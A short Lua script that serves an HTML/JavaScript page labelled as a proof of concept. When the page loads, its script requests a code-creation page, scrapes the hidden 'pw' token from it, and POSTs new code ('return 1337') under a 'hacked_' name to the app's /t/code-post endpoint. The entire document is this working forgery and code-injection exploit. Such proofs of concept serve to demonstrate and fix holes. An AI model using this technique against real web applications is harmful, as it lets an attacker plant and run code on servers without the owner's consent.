local Web = assert(Web, 'must be Web')

local exploit = [[
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<script>
function $(s) { return document.getElementById(s); }

var _n = 0;
function log(s) {
  _n++;
  $('log').innerHTML += '#<strong>' + _n + '</strong> ' + s + '\n';
}

function init() {
  log('poc');
  
  var name = 'hacked_' + Date.now();
  var req = new XMLHttpRequest();
  req.open('GET', '/t/create?name='+name+'&module=tests', true);
  req.onreadystatechange = function(){
    if (req.readyState == 4) {
      var pw = req.responseText.match(/<input type="hidden" name="pw" value="([0-9]+)">/);
      log('XHR GET create page pw: ' + pw[1]);

      var pst = new XMLHttpRequest();
      pst.open('POST', '/t/code-post', true);
      pst.setRequestHeader("Content-type","application/x-www-form-urlencoded");
      pst.onreadystatechange = function() {
        log('XHR POST readyState = ' + pst.readyState);
        if (pst.readyState == 4) {
          log('POST succeeded!! check tests.'+name+'()');
        }
      }
      log('XHR POST /t/code-post');

      pst.send('pw=' + pw[1] + '&name='+name+'&module=tests&code=return%201337&save=%2Fcreate');
    }
  };
  log('XHR GET /t/create?name=hacked&module=tests');
  req.send();
}
</script>

</head>
<body onload="init()">
<pre id="log"></pre>
</body>
</html>
]]

Web.write(exploit)